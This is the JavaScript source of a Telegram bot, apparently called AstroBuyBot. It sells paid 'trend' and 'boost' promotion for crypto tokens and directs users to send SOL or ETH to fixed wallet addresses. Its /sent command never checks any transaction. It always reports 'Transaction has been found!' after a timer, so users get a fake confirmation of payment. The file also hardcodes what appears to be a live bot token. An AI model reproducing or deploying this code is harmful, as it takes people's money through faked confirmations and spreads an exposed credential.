const TelegramBot = require('node-telegram-bot-api');
const keep_alive = require('./keep_alive.js');

// Replace with your bot's token
const token = '7430566451:AAHzrMBZ4YjNs52rHumjIJTdaLhXU8v5Mws';

// Exchange rates
const SOL_TO_NGN = 236953; // 1 SOL in NGN
const NGN_TO_ETH = 0.0599 / 3952472; // ETH per NGN

// Create a bot that uses 'polling' to fetch new updates
const bot = new TelegramBot(token, { polling: true });

// Store user data
const userData = {};

// Listener for the '/start' command
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;

    // Define the message options with the button
    const options = {
        reply_markup: {
            inline_keyboard: [
                [
                    {
                        text: 'TREND', // Button text
                        callback_data: 'trend_clicked', // Data sent back when button is clicked
                    },
                ],
            ],
        },
    };

    // Send the message with the button
    bot.sendMessage(chatId, 'Trend on ASTRO BUY', options);
});

// Listener for the 'TREND' button click
bot.on('callback_query', (callbackQuery) => {
    const msg = callbackQuery.message;
    const chatId = msg.chat.id;

    if (callbackQuery.data === 'trend_clicked') {
        // Ask for the blockchain choice
        const blockchainOptions = {
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: 'ETHEREUM',
                            callback_data: 'blockchain_ETHEREUM',
                        },
                        {
                            text: 'SOLANA',
                            callback_data: 'blockchain_SOLANA',
                        },
                    ],
                ],
            },
        };

        bot.sendMessage(chatId, 'What blockchain do you wish to trend?', blockchainOptions);
    }

    // Handle blockchain choices
    if (callbackQuery.data.startsWith('blockchain_')) {
        const selectedBlockchain = callbackQuery.data.split('_')[1]; // Get the blockchain name
        userData[chatId] = { blockchain: selectedBlockchain }; // Store selected blockchain

        bot.sendMessage(chatId, `You chose to trend on: ${selectedBlockchain}. Please provide your token contract address:`);
    }

    // Handle price range selection
    if (callbackQuery.data.startsWith('duration_')) {
        const blockchain = userData[chatId]?.blockchain;

        // Define wallet addresses based on the selected blockchain
        let walletAddress;
        if (blockchain === 'SOLANA') {
            walletAddress = '4AULMKu4QUyCq1HeXbLaEt51soUj1LUmr8pBJGPFrZ9X';
        } else if (blockchain === 'ETHEREUM') {
            walletAddress = '0x77E8Bd7DA80E6ad104D15709cE57A2D140C2AeeF';
        }

        // Send the payment instruction message with double line breaks
        const paymentMessage = `Add FUNDS to your wallet\n\nPlease make payment to this wallet address:\n\n${walletAddress}\n\nHit /sent to confirm payment/transaction.`;
        bot.sendMessage(chatId, paymentMessage);
    }
});

// Handle messages for token address and project template
bot.on('message', (msg) => {
    const chatId = msg.chat.id;

    // Handle token contract address input
    if (userData[chatId]?.blockchain && !userData[chatId]?.tokenAddress) {
        userData[chatId].tokenAddress = msg.text; // Store token address
        bot.sendMessage(chatId, 'Thank you! Now, please provide your project template:');
    }
    // Handle project template input
    else if (userData[chatId]?.tokenAddress && !userData[chatId]?.projectTemplate) {
        userData[chatId].projectTemplate = msg.text; // Store project template

        // After receiving the project template, confirm the trend and offer the BOOST option
        const boostOptions = {
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: 'BOOST TREND', // Button text
                            callback_data: 'boost_trend', // Data sent back when button is clicked
                        },
                    ],
                ],
            },
        };

        // Send message with two line spaces after "Great! Trend started."
        bot.sendMessage(chatId, 'Great! Trend started.\n\nBoost your trend and get more buys.', boostOptions);
    }
});

// Listener for 'BOOST TREND' button click
bot.on('callback_query', (callbackQuery) => {
    const msg = callbackQuery.message;
    const chatId = msg.chat.id;

    if (callbackQuery.data === 'boost_trend') {
        const blockchain = userData[chatId]?.blockchain;

        // Set price ranges and durations based on the selected blockchain
        let price1, price2, price3, price4, price5;

        if (blockchain === 'SOLANA') {
            price1 = `1sol - 2hrs`;
            price2 = `2sol - 5hrs`;
            price3 = `4sol - 8hrs`;
            price4 = `7sol - 17hrs`;
            price5 = `10sol - 24hrs`;
        } else if (blockchain === 'ETHEREUM') {
            const eth1 = (SOL_TO_NGN * NGN_TO_ETH).toFixed(5); // 1 SOL to ETH
            const eth2 = (2 * SOL_TO_NGN * NGN_TO_ETH).toFixed(5);
            const eth3 = (4 * SOL_TO_NGN * NGN_TO_ETH).toFixed(5);
            const eth4 = (7 * SOL_TO_NGN * NGN_TO_ETH).toFixed(5);
            const eth5 = (10 * SOL_TO_NGN * NGN_TO_ETH).toFixed(5);

            price1 = `${eth1} ETH - 2hrs`;
            price2 = `${eth2} ETH - 5hrs`;
            price3 = `${eth3} ETH - 8hrs`;
            price4 = `${eth4} ETH - 17hrs`;
            price5 = `${eth5} ETH - 24hrs`;
        }

        // Show duration options with price in the selected blockchain
        const durationOptions = {
            reply_markup: {
                inline_keyboard: [
                    [{ text: price1, callback_data: 'duration_2hrs' }],
                    [{ text: price2, callback_data: 'duration_5hrs' }],
                    [{ text: price3, callback_data: 'duration_8hrs' }],
                    [{ text: price4, callback_data: 'duration_17hrs' }],
                    [{ text: price5, callback_data: 'duration_24hrs' }],
                ],
            },
        };

        bot.sendMessage(chatId, 'Choose a duration to boost your trend:', durationOptions);
    }
});

// Listener for the '/sent' command
bot.onText(/\/sent/, (msg) => {
    const chatId = msg.chat.id;

    // Send no transactions found message
    bot.sendMessage(chatId, `No transactions found.\n\nIt is advisable to wait a few moments after the transaction has been made, thank you for your patience.`);

    // Wait 1 minute (60000 milliseconds) and then send confirmation message
    setTimeout(() => {
        bot.sendMessage(chatId, `Transaction has been found!\n\nTrend will begin shortly, thanks for choosing @AstroBuyBot\n/start`);
    }, 240000); // 1 minute delay
});